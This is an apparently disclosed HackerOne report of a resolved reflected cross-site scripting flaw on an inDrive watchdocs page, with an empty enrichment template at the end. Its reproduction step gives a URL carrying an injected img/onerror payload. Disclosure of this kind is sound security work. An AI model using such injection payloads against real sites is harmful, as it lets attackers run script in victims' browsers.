---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2028265'
original_report_id: '2028265'
title: '#3 XSS on watchdocs.indriverapp.com'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: indrive
created_at: '2023-06-16T01:50:00.117Z'
disclosed_at: '2024-04-11T08:33:03.409Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 55
asset_identifier: watchdocs.indriverapp.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# #3 XSS on watchdocs.indriverapp.com

## Metadata

- HackerOne Report ID: 2028265
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: indrive
- Disclosed At: 2024-04-11T08:33:03.409Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Found an XSS

## Steps To Reproduce:

  1. Go to https://watchdocs.indriverapp.com/webview/v1/transport-change?phone=██████&token=█████████&service=intercity3&jwt=fw%22%3E%3Cimg%20src=fwa%20onerror=alert(1)%3E
  

## Supporting Material/References:
████

## Impact

Execute Javascript on any victim browser

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
